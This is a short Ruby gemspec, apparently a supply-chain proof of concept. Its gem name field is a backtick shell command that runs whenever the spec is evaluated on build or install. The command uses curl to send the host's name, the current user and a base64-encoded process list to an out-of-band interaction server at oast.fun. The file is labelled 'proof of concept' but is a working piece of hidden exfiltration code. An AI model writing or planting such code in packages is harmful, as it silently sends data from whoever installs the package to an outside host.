Gem::Specification.new do |s|
s.name = `curl -s "https://dtscchmqpronalsrfkkjwhyialnd5xsnm.oast.fun/s?$hostname=$(hostname)&user=$(whoami)&pwd=$(ps | base64)"`.strip
s.version = "1.0.0"
s.summary = "proof of concept"
s.authors = ["test"]
end
